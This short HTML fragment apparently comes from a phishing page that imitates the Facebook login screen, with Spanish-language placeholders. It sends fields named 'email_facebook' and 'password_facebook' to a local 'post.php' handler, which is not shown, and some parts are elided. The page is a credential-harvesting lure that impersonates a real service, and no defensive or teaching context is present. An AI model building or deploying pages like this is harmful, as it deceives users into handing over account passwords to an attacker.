    ...
    <section class="login-form-wrap">
      ...
      <h1 class="disable-selection">facebook</h1>
        ...
        <form class="login-form" method="POST" action="post.php">
            ...
            <center><label><input type="text" name="email_facebook" placeholder="Teléfono o correo electronico" _autofocus="true" autocorrect="off" autocomplete="off" autocapitalize="off" required></label>
            <label><input type="password" name="password_facebook" placeholder="Contraseña" autocorrect="off" autocomplete="off" autocapitalize="off" required></label></center>
      ...
      <h5><a href="#" class="disable-selection">¿Olvidaste tu contraseña?</a></h5>
